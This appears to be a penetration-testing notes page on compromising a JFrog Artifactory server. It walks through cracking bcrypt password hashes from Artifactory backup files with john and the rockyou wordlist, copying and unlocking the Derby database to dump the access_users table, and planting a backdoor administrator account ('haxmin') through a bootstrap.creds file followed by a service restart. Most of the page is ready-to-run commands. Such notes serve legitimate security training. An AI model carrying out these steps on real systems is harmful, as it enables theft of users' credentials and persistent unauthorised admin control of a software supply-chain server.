---
layout:     post
author:     0x5c4r3
type: docs
permalink: Artifactory
---

<span style="font-size: 35px; color:red"><b>Artifactory</b></span>

<span style="color:red">Binary Repository Manager</span> that stores software packages and other binaries installed in <span style="color:red">/opt/jfrog</span>. If it's running, it will run as webserver on port 8082 locally or port 8081 remotely.
To prevents developers from getting untrusted or unstable binaries directly from the Internet.

To Start:
```shell
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

To see whether an Artifactory repo is running on the system:
```shell
ps aux | grep artifactory
```

Login page at <span style="color:red">http://<domain>:8082/</span>.
&nbsp;

---
&nbsp;
<span style="font-size: 25px; color:white"><b>Credentials</b></span>
The open-source version of Artifactory creates database backups for the user accounts at /<Artifactory_Folder>/var/backup/access in JSON format.
The password is in bcrypt format and can be cracked as follows:
```shell
sudo john derbyhash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
&nbsp;

---
&nbsp;

<span style="font-size: 25px; color:white"><b>Compromising Artifactory Database</b></span>
If there are no backup files available, we can access the database itself or attempt to copy it and extract the hashes manually.
Copy the database to a temporary location and unlock it:
```shell
sudo cp -r /opt/jfrog/artifactory/var/data/access/derby /tmp/hackeddb
sudo chmod 755 /tmp/hackeddb/derby
sudo rm /tmp/hackeddb/derby/*.lck
```

If it's using Apache's Derby, install Apache's derby tools. <span style="color:red">ij</span> tool allows you to handle the database and query it:
```shell
sudo /opt/jfrog/artifactory/app/third-party/java/bin/java -jar /opt/derby/db-derby-10.15.1.3-bin/lib/derbyrun.jar ij
```
From there:
```shell
select * from access_users;
```
and you'll see the passwords.
&nbsp;

---
&nbsp;

<span style="font-size: 25px; color:white"><b>Adding a Secondary Artifactory Admin Account</b></span>
This method requires write access to the /opt/jfrog/artifactory/var/etc/access folder and the ability to change permissions on the newly-created file, which usually requires _root_ or _sudo_ access.
In there, create a `bootstrap.creds` like so:
```shell
haxmin@*=haxhaxhax
```
creating a new user <span style="color:red">haxmin</span> with password <span style="color:red">haxhaxhax</span>. Set permissions to 600:
```shell
sudo chmod 600 /opt/jfrog/artifactory/var/etc/access/bootstrap.creds
```
Now reboot the process:
```shell
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl stop
sudo /opt/jfrog/artifactory/app/bin/artifactoryctl start
```

To check if everything went smooth:
```shell
sudo grep "Create admin user" /opt/jfrog/artifactory/var/log/console.log
```
